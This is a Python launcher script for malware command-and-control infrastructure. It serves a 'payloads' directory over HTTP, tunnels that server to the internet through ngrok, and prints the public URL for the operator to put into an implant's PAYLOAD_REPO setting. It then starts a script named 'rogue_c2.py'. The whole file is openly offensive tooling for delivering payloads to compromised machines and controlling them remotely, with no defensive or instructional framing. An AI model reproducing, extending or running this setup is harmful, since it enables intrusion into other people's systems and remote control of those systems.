#!/usr/bin/env python3
import subprocess
import time
import os
import requests
import threading

NGROK_AUTH_TOKEN = "your-ngrok-auth-token"  # paste your ngrok token here once
PAYLOAD_PORT = 8000
NGROK_API = "http://127.0.0.1:4040/api/tunnels"

def start_payload_server():
    os.chdir("payloads")
    subprocess.Popen(["python3", "-m", "http.server", str(PAYLOAD_PORT)])

def start_ngrok():
    subprocess.Popen(["ngrok", "http", str(PAYLOAD_PORT)])
    time.sleep(5)  
    try:
        tunnels = requests.get(NGROK_API).json()["tunnels"]
        for t in tunnels:
            if t["proto"] == "https":
                return t["public_url"]
    except:
        return None

def start_rogue_c2():
    subprocess.run(["python3", "rogue_c2.py"])

def main():
    print("[*] Starting payload HTTP server on port 8000...")
    threading.Thread(target=start_payload_server, daemon=True).start()

    print("[*] Launching ngrok tunnel...")
    public_url = start_ngrok()

    if public_url:
        print(f"[+] Ngrok HTTPS URL: {public_url}")
        print("[*] Update your implant's PAYLOAD_REPO to use this:")
        print(f"    PAYLOAD_REPO = \"{public_url}/\"")
    else:
        print("[!] Failed to get ngrok URL")

    print("\n[*] Starting Rogue C2 now...\n")
    start_rogue_c2()

if __name__ == "__main__":
    main()
